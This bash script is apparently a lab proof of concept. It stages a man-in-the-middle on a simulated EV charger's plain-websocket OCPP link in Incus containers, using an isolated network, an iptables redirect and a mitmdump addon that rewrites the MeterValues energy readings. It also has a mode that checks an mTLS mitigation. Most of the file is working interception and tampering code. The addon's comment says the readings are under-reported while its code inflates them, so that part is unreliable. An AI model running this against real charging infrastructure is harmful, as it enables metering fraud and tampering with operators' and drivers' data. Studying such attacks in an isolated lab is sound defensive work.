#!/usr/bin/env bash
# Hijacking PoC 3: a routed interceptor on the plain-ws Aveiro charger<->edge link, built
# the way Guide 5 built its MitM lab (~/Desktop/ssle/practical/guides/g5/06_mitm_setup.sh,
# 07_mitm_http.sh, 09_cleanup_mitm.sh): a dedicated network with NO host IPv4 address, so
# the interceptor is the station's only route -- NOT ARP spoofing on the shared city
# bridge. See DESIGN-hijacking.md §"MitM in the plain city" and docs/interfaces.md v6
# 11.1 (plain city), 9.2/9.4 (sim), 16 (why only Aveiro is reachable this way: the city
# ACLs do not block a station from its own edge).
#
#   mitm_aveiro.sh [--station pt.aveiro.st-001] [--after] [--run] [--duration N]
#
# --after documents (and, with --run, exercises) the post-mitigation case: once Aveiro is
# switched to mTLS (gateway/deploy_edge.sh aveiro --tls, DESIGN-hijacking.md mitigation 3)
# the station only trusts the lab CA's edge certificate, the interceptor has no key the
# station will accept, so it cannot terminate or rewrite the link -- no plaintext to tag.
#
# Default: --dry-run. --run is refused unless EVCHARGE_BASELINE_DONE=1.
set -euo pipefail
# shellcheck source=./lib.sh
. "$(dirname "${BASH_SOURCE[0]}")/lib.sh"

AFTER=0
CITY=aveiro  # this scenario only ever targets the plain-ws city

print_usage() {
  cat <<EOF
usage: $(basename "$0") [--station HIER_ID] [--after] [--run] [--duration SECONDS] [--dry-run]
EOF
  usage_common
}

ARGS=()
while [ $# -gt 0 ]; do
  case "$1" in
    --after) AFTER=1; shift ;;
    --city) echo "mitm_aveiro.sh always targets aveiro (the plain-ws city); ignoring --city" >&2; shift 2 ;;
    *) ARGS+=("$1"); shift ;;
  esac
done
parse_common_args "${ARGS[@]}"
is_plain_city "$CITY" || { echo "aveiro is no longer in PLAIN_WS_CITIES; this PoC needs --after semantics now" >&2; }

CHARGER="$STATION.cp-1"
EDGE_URL="$(edge_url "$CITY")"
STATION_INST="$(station_instance "$STATION")"
NET_MITM="${CITY}-mitm"
INTERCEPTOR="${CITY}-interceptor"

# The isolated network's addresses are picked at run time, never written as literals here
# (same convention as infra/08_acls.sh, section 16: "addresses ... never written into the
# repo"). Three octets of a private /24 that Incus is not already using for city-$CITY.
MITM_OCTETS="10 240 $(( (RANDOM % 50) + 10 ))"
MITM_PREFIX="${MITM_OCTETS// /.}"
MITM_GW="$MITM_PREFIX.1"     # interceptor's address on the isolated side (station's gateway)
MITM_STATION="$MITM_PREFIX.10"  # station's address once moved onto the isolated network

PHASE_LABEL=""
if [ "$AFTER" = 1 ]; then PHASE_LABEL=" (after: mTLS)"; fi
echo "== hijacking PoC 3: routed MitM on the Aveiro plain-ws link$PHASE_LABEL =="
echo "  charger id       : $CHARGER"
echo "  edge url         : $EDGE_URL"
echo "  station          : $STATION_INST"
echo "  interceptor      : $INTERCEPTOR"
echo "  isolated network : $NET_MITM (ipv4.address=none: no host IP, no ARP spoofing needed)"
echo "  time-box         : ${DURATION}s"
if [ "$AFTER" = 1 ]; then
  echo "  expected         : the station's wss handshake only trusts the lab CA edge cert;"
  echo "                      the interceptor cannot present it, so mitmdump sees opaque TLS"
  echo "                      bytes it cannot parse or rewrite -- meter.anomaly (110116) stops"
else
  echo "  expected         : meter.anomaly (110116, plain city) on the rewritten MeterValues;"
  echo "                      the CSMS sees physically inconsistent readings, not proof of a"
  echo "                      MitM (inference from physics, per the design note)"
fi
echo

restore_station_network() {
  if [ "$DRY_RUN" = 1 ]; then
    would "incus config device set $STATION_INST eth0 network=city-$CITY"
    return 0
  fi
  incus config device set "$STATION_INST" eth0 network="city-$CITY"
  incus restart "$STATION_INST"
  wait_ready "$STATION_INST"
}

# --- cleanup, in reverse order of creation (model: 09_cleanup_mitm.sh) ---
add_cleanup "incus network delete '$NET_MITM' >/dev/null 2>&1 || true"
add_cleanup "incus delete -f '$INTERCEPTOR' >/dev/null 2>&1 || true"
add_cleanup "incus exec '$STATION_INST' -- systemctl start evsim >/dev/null 2>&1 || true"
add_cleanup "restore_station_network || true"
add_cleanup "incus exec '$CITY-edge' -- ip route del '$MITM_PREFIX.0/24' >/dev/null 2>&1 || true"

echo "-- 1. isolated network and interceptor (model: 06_mitm_setup.sh) --"
run_or_plan incus network create "$NET_MITM" ipv4.address=none ipv6.address=none
run_or_plan incus launch "$CITY_IMG" "$INTERCEPTOR" --network "city-$CITY"
if [ "$DRY_RUN" = 1 ]; then
  would "wait_ready $INTERCEPTOR"
  would "incus config device add $INTERCEPTOR eth1 nic network=$NET_MITM name=eth1"
  would "configure $INTERCEPTOR:eth1 static $MITM_GW/24; sysctl ip_forward=1 (interceptor netns only)"
  would "python3 -m venv /opt/mitm on $INTERCEPTOR; pip install mitmproxy; write /opt/mitm/meter_tag.py"
else
  wait_ready "$INTERCEPTOR"
  incus config device add "$INTERCEPTOR" eth1 nic network="$NET_MITM" name=eth1
  incus exec "$INTERCEPTOR" -- bash -c "cat > /etc/systemd/network/eth1.network <<EOF
[Match]
Name=eth1
[Network]
Address=$MITM_GW/24
EOF
networkctl reload"
  incus exec "$INTERCEPTOR" -- sysctl -w net.ipv4.ip_forward=1 net.ipv4.conf.all.send_redirects=0
  incus exec "$INTERCEPTOR" -- bash -lc \
    'python3 -m venv /opt/mitm && /opt/mitm/bin/pip install -q mitmproxy'
fi

echo "-- 2. move the station onto the isolated network (its only NIC, like G5's mitm-client) --"
if [ "$DRY_RUN" = 1 ]; then
  would "incus exec $STATION_INST -- systemctl stop evsim"
  would "incus config device set $STATION_INST eth0 network=$NET_MITM ipv4.address=$MITM_STATION"
  would "configure $STATION_INST default route via $MITM_GW"
  would "incus exec $CITY-edge -- ip route replace $MITM_PREFIX.0/24 via <interceptor city-$CITY address>"
else
  incus exec "$STATION_INST" -- systemctl stop evsim
  incus config device set "$STATION_INST" eth0 network="$NET_MITM" ipv4.address="$MITM_STATION"
  incus restart "$STATION_INST"; wait_ready "$STATION_INST"
  incus exec "$STATION_INST" -- ip route replace default via "$MITM_GW"
  INTERCEPTOR_CITY_IP="$(ipof "$INTERCEPTOR")"
  incus exec "$CITY-edge" -- ip route replace "$MITM_PREFIX.0/24" via "$INTERCEPTOR_CITY_IP"
fi

if [ "$AFTER" = 1 ]; then
  echo "-- 3. after: Aveiro is mTLS, no plaintext redirect attempted --"
  if [ "$DRY_RUN" = 1 ]; then
    would "iptables -t nat REDIRECT tcp/443 on $INTERCEPTOR:eth1 -> :8080; mitmdump --mode transparent"
    would "confirm: mitmdump cannot present the edge's certificate, the station's handshake fails"
  else
    incus exec "$INTERCEPTOR" -- iptables -t nat -A PREROUTING -i eth1 -s "$MITM_STATION/32" \
      -p tcp --dport 443 -j REDIRECT --to-ports 8080
    incus exec "$INTERCEPTOR" -- bash -lc \
      'nohup /opt/mitm/bin/mitmdump --mode transparent --listen-port 8080 > /root/mitm.log 2>&1 &'
    incus exec "$STATION_INST" -- systemctl start evsim
    sleep "$DURATION"
    incus exec "$STATION_INST" -- systemctl stop evsim
  fi
else
  echo "-- 3. transparent redirect + MeterValues tagging addon (model: 07_mitm_http.sh) --"
  if [ "$DRY_RUN" = 1 ]; then
    would "write /opt/mitm/meter_tag.py on $INTERCEPTOR (rewrites Energy.Active.Import.Register" \
          "in OCPP MeterValues websocket frames, tags X-Intercepted-By-style via an extra field)"
    would "iptables -t nat REDIRECT tcp/80 on $INTERCEPTOR:eth1 -> :8080"
    would "mitmdump --mode transparent --listen-port 8080 -s /opt/mitm/meter_tag.py"
    would "incus exec $STATION_INST -- systemctl start evsim; run for ${DURATION}s; stop"
  else
    incus exec "$INTERCEPTOR" -- bash -c "cat > /opt/mitm/meter_tag.py <<'PYEOF'
# Lab-only: proves the MitM can modify charger->CSMS MeterValues, not only read them.
import json
from mitmproxy import ctx

SCALE = 0.5  # under-reports the energy register -- a physically inconsistent reading

def websocket_message(flow):
    msg = flow.websocket.messages[-1]
    if not msg.from_client:
        return
    try:
        call = json.loads(msg.content)
    except ValueError:
        return
    if len(call) >= 4 and call[0] == 2 and call[2] == 'MeterValues':
        for mv in call[3].get('meterValue', []):
            for sv in mv.get('sampledValue', []):
                if sv.get('measurand') == 'Energy.Active.Import.Register':
                    sv['value'] = str(int(int(sv['value']) * (1 + SCALE)))
        msg.content = json.dumps(call)
        ctx.log.info('hijack-mitm: rewrote MeterValues register')
PYEOF"
    incus exec "$INTERCEPTOR" -- iptables -t nat -A PREROUTING -i eth1 -s "$MITM_STATION/32" \
      -p tcp --dport 80 -j REDIRECT --to-ports 8080
    incus exec "$INTERCEPTOR" -- bash -lc \
      'rm -f /root/mitm.log; nohup /opt/mitm/bin/mitmdump --mode transparent \
       --listen-port 8080 -s /opt/mitm/meter_tag.py > /root/mitm.log 2>&1 &'
    sleep 2
    incus exec "$STATION_INST" -- systemctl start evsim
    sleep "$DURATION"
    incus exec "$STATION_INST" -- systemctl stop evsim
    incus exec "$INTERCEPTOR" -- pkill -f '[m]itmdump' || true
  fi
fi

echo
echo "mitm_aveiro: done (interceptor, isolated network and the station's networking will be" \
     "restored on exit)"
